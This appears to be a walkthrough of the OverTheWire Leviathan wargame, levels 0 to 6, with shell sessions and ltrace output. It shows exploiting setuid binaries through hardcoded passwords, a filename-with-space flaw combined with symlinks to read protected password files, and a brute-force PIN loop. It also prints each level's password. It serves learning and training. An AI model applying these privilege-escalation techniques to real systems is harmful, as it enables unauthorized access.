
---

`leviathan0:leviathan0`
`leviathan.labs.overthewire.org`
`port:2223`
### Leviathan0

```
leviathan0@gibson:~$ ls -la
total 24
--SNIP--
drwxr-x---  2 leviathan1 leviathan0 4096 Sep 19 07:07 .backup
--SNIP--
leviathan0@gibson:~$ cd .backup
leviathan0@gibson:~/.backup$ ls
bookmarks.html
leviathan0@gibson:~/.backup$ cat bookmarks.html | grep leviathan1
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is 3QJ3TgzHDq" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
leviathan0@gibson:~/.backup$
```

```
cat bookmarks.html | grep leviathan1 | sed -n 's/.*password for leviathan1 is \([^"]*\).*/\1/p'
```

`3QJ3TgzHDq`

### Leviathan1

```
leviathan1@gibson:~$ ls -la
total 36
--SNIP--
-r-sr-x---  1 leviathan2 leviathan1 15080 Sep 19 07:07 check
--SNIP--
leviathan1@gibson:~$
```

```
leviathan1@gibson:~$ ./check
password: something
Wrong password, Good Bye ...
leviathan1@gibson:~$
```

```
leviathan1@gibson:~$ strings check
td8
/lib/ld-linux.so.2
_IO_stdin_used
puts
__stack_chk_fail
system
getchar
__libc_start_main
printf
setreuid
strcmp
geteuid
libc.so.6
GLIBC_2.4
GLIBC_2.34
GLIBC_2.0
__gmon_start__
secr
love
password:
/bin/sh
Wrong password, Good Bye ...
;*2$"0
GCC: (Ubuntu 13.2.0-23ubuntu4) 13.2.0
crt1.o
__abi_tag
__wrap_main
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
check.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
strcmp@GLIBC_2.0
__libc_start_main@GLIBC_2.34
__x86.get_pc_thunk.bx
printf@GLIBC_2.0
getchar@GLIBC_2.0
_edata
_fini
__stack_chk_fail@GLIBC_2.4
geteuid@GLIBC_2.0
__data_start
puts@GLIBC_2.0
system@GLIBC_2.0
__gmon_start__
__dso_handle
_IO_stdin_used
setreuid@GLIBC_2.0
_end
_dl_relocate_static_pie
_fp_hw
__bss_start
__TMC_END__
_init
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got
.got.plt
.data
.bss
.comment
leviathan1@gibson:~$
```

```
leviathan1@gibson:~$ ltrace ./check
__libc_start_main(0x80490ed, 1, 0xffffd494, 0 <unfinished ...>
printf("password: ")                                = 10
getchar(0, 0, 0x786573, 0x646f67password: something
)                   = 115
getchar(0, 115, 0x786573, 0x646f67)                 = 111
getchar(0, 0x6f73, 0x786573, 0x646f67)              = 109
strcmp("som", "sex")                                = 1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                = 29
+++ exited (status 0) +++
leviathan1@gibson:~$
```

- `strcmp("som", "sex")                                = 1`

```
leviathan1@gibson:~$ ./check
password: sex
$ whoami
leviathan2
$ cat /etc/leviathan_pass/leviathan2
NsN1HwFoyN
$
```

`NsN1HwFoyN`

### Leviathan2

```
leviathan2@gibson:~$ ls -la
total 36
--SNIP--
-r-sr-x---  1 leviathan3 leviathan2 15068 Sep 19 07:07 printfile
--SNIP--
leviathan2@gibson:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename
leviathan2@gibson:~$
```

```
leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
leviathan2@gibson:~$ ./printfile .bash_logout
# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
leviathan2@gibson:~$
```

```
leviathan2@gibson:~$ ltrace ./printfile .bash_logout
__libc_start_main(0x80490ed, 2, 0xffffd464, 0 <unfinished ...>
access(".bash_logout", 4)                           = 0
snprintf("/bin/cat .bash_logout", 511, "/bin/cat %s", ".bash_logout") = 21
geteuid()                                           = 12002
geteuid()                                           = 12002
setreuid(12002, 12002)                              = 0
system("/bin/cat .bash_logout"# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                              = 0
+++ exited (status 0) +++
leviathan2@gibson:~$
```

Test with multiple files:

```
leviathan2@gibson:~$ ltrace ./printfile .bash_logout .profile
__libc_start_main(0x80490ed, 3, 0xffffd454, 0 <unfinished ...>
access(".bash_logout", 4)                           = 0
snprintf("/bin/cat .bash_logout", 511, "/bin/cat %s", ".bash_logout") = 21
geteuid()                                           = 12002
geteuid()                                           = 12002
setreuid(12002, 12002)                              = 0
system("/bin/cat .bash_logout"# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                              = 0
+++ exited (status 0) +++
leviathan2@gibson:~$
```

- The executable only takes one argument.
- what about filename with space.
- The `mktemp` command in Unix-like operating systems is used to create a temporary file or directory with a unique name.

```
leviathan2@gibson:~$ mktemp -d
/tmp/tmp.VkCvDbg5ly
leviathan2@gibson:~$ touch /tmp/tmp.VkCvDbg5ly/"test file.txt"
leviathan2@gibson:~$ ls -la /tmp/tmp.VkCvDbg5ly
total 848
drwx------    2 leviathan2 leviathan2   4096 Oct  5 16:26 .
drwxrwx-wt 3908 root       root       860160 Oct  5 16:26 ..
-rw-rw-r--    1 leviathan2 leviathan2      0 Oct  5 16:26 test file.txt
leviathan2@gibson:~$ ltrace ./printfile /tmp/tmp.VkCvDbg5ly/"test file.txt"
__libc_start_main(0x80490ed, 2, 0xffffd444, 0 <unfinished ...>
access("/tmp/tmp.VkCvDbg5ly/test file.tx"..., 4)    = 0
snprintf("/bin/cat /tmp/tmp.VkCvDbg5ly/tes"..., 511, "/bin/cat %s", "/tmp/tmp.VkCvDbg5ly/test file.tx"...) = 42
geteuid()                                           = 12002
geteuid()                                           = 12002
setreuid(12002, 12002)                              = 0
system("/bin/cat /tmp/tmp.VkCvDbg5ly/tes".../bin/cat: /tmp/tmp.VkCvDbg5ly/test: No such file or directory
/bin/cat: file.txt: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                              = 256
+++ exited (status 0) +++
leviathan2@gibson:~$
```

- The executable is only taking first part, as an argument.

```
leviathan2@gibson:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/tmp.VkCvDbg5ly/test
leviathan2@gibson:~$ chmod 777 /tmp/tmp.VkCvDbg5ly
leviathan2@gibson:~$ ls -la /tmp/tmp.VkCvDbg5ly
total 848
drwxrwxrwx    2 leviathan2 leviathan2   4096 Oct  5 16:28 .
drwxrwx-wt 3908 root       root       860160 Oct  5 16:28 ..
lrwxrwxrwx    1 leviathan2 leviathan2     30 Oct  5 16:28 test -> /etc/leviathan_pass/leviathan3
-rw-rw-r--    1 leviathan2 leviathan2      0 Oct  5 16:26 test file.txt
leviathan2@gibson:~$ ./printfile /tmp/tmp.VkCvDbg5ly/"test file.txt"
f0n8h2iWLP
/bin/cat: file.txt: No such file or directory
leviathan2@gibson:~$
```

`f0n8h2iWLP`

### Leviathan3

```
leviathan3@gibson:~$ ls -la
total 40
--SNIP--
-r-sr-x---  1 leviathan4 leviathan3 18096 Sep 19 07:07 level3
--SNIP--
leviathan3@gibson:~$ ./level3
Enter the password> something
bzzzzzzzzap. WRONG
leviathan3@gibson:~$ ltrace ./level3
__libc_start_main(0x80490ed, 1, 0xffffd494, 0 <unfinished ...>
strcmp("h0no33", "kakaka")                          = -1
printf("Enter the password> ")                      = 20
fgets(Enter the password> something
"something\n", 256, 0xf7fae5c0)               = 0xffffd26c
strcmp("something\n", "snlprintf\n")                = 1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                          = 19
+++ exited (status 0) +++
leviathan3@gibson:~$
```

```
leviathan3@gibson:~$ ./level3
Enter the password> snlprintf
[You've got shell]!
$ whoami
leviathan4
$ cat /etc/leviathan_pass/leviathan4
WG1egElCvO
$
```

`WG1egElCvO`

### Leviathan4

```
leviathan4@gibson:~$ ls -la
total 24
drwxr-xr-x  3 root root       4096 Sep 19 07:07 .
drwxr-xr-x 83 root root       4096 Sep 19 07:09 ..
-rw-r--r--  1 root root        220 Mar 31  2024 .bash_logout
-rw-r--r--  1 root root       3771 Mar 31  2024 .bashrc
-rw-r--r--  1 root root        807 Mar 31  2024 .profile
dr-xr-x---  2 root leviathan4 4096 Sep 19 07:07 .trash
leviathan4@gibson:~$ cd .trash
leviathan4@gibson:~/.trash$ ls -la
total 24
dr-xr-x--- 2 root       leviathan4  4096 Sep 19 07:07 .
drwxr-xr-x 3 root       root        4096 Sep 19 07:07 ..
-r-sr-x--- 1 leviathan5 leviathan4 14936 Sep 19 07:07 bin
leviathan4@gibson:~/.trash$ ./bin
00110000 01100100 01111001 01111000 01010100 00110111 01000110 00110100 01010001 01000100 00001010
leviathan4@gibson:~/.trash$
```

`0dyxT7F4QD`

### Leviathan5

```
leviathan5@gibson:~$ ls -la
total 36
drwxr-xr-x  2 root       root        4096 Sep 19 07:07 .
drwxr-xr-x 83 root       root        4096 Sep 19 07:09 ..
-rw-r--r--  1 root       root         220 Mar 31  2024 .bash_logout
-rw-r--r--  1 root       root        3771 Mar 31  2024 .bashrc
-r-sr-x---  1 leviathan6 leviathan5 15140 Sep 19 07:07 leviathan5
-rw-r--r--  1 root       root         807 Mar 31  2024 .profile
leviathan5@gibson:~$ ./leviathan5
Cannot find /tmp/file.log
leviathan5@gibson:~$ ltrace ./leviathan5
__libc_start_main(0x804910d, 1, 0xffffd484, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                         = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                   = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
leviathan5@gibson:~$ touch /tmp/file.log
leviathan5@gibson:~$ ./leviathan5
leviathan5@gibson:~$ touch /tmp/file.log
leviathan5@gibson:~$ ltrace ./leviathan5
__libc_start_main(0x804910d, 1, 0xffffd484, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                         = 0x804d1a0
fgetc(0x804d1a0)                                    = '\377'
feof(0x804d1a0)                                     = 1
fclose(0x804d1a0)                                   = 0
getuid()                                            = 12005
setuid(12005)                                       = 0
unlink("/tmp/file.log")                             = 0
+++ exited (status 0) +++
leviathan5@gibson:~$ echo "test" > /tmp/file.log
leviathan5@gibson:~$ ./leviathan5
test
leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@gibson:~$ ./leviathan5
szo7HDB88w
leviathan5@gibson:~$
```

`szo7HDB88w`

### Leviathan6

```
for i in {0000..9999}; do echo $i; ./leviathan6 $i; done
```

```
--SNIP--
7123
$ whoami
leviathan7
$ cat /etc/leviathan_pass/leviathan7
qEs5Io5yM8
$
```

`qEs5Io5yM8`
